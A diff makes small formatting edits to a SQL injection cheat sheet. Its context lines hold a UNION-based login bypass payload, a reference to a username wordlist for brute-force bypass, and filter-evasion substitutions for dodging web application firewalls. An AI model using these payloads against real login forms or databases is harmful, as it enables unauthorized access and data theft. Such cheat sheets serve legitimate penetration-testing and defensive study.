@@ -254,7 +254,7 @@ Challenge demo available at [http://web.jarvisoj.com:32772](http://web.jarvisoj.
 admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
 ```
 **Recomended**: [Passwd1234](https://github.com/carlospolop-forks/PayloadsAllTheThings/blob/master/SQL%20injection/Intruders/cp_SQLi_passwd_1234.txt)
-Use as username each line of the file and as password *1234*.
+(Use as username each line of the file and as password *1234*)
 
 ## GBK Authentication Bypass
 
@@ -339,7 +339,7 @@ Full ascii uppercase and lowercase replace:
 
 ## Routed SQL injection
 Routed SQL injection is a situation where the injectable query is not the one which gives output but the output of injectable query goes to the query which gives output.
-[Paper](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt)
+([Paper](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt))
 
 Example:
 
@@ -397,7 +397,7 @@ AND   -> && -> %26%26
 OR    -> || -> %7C%7C
 =     -> LIKE,REGEXP, not < and not >
 > X   -> not between 0 and X
-WHERE -> HAVING --> LIMIT X,1 --> group_concat(CASE(table_schema)When(database())Then(table_name)END) --> group_concat(if(table_schema=database(),table_name,null))
+WHERE -> HAVING --> LIMIT X,1 -> group_concat(CASE(table_schema)When(database())Then(table_name)END) -> group_concat(if(table_schema=database(),table_name,null))
 ```
 
 Information_schema.tables Alternative
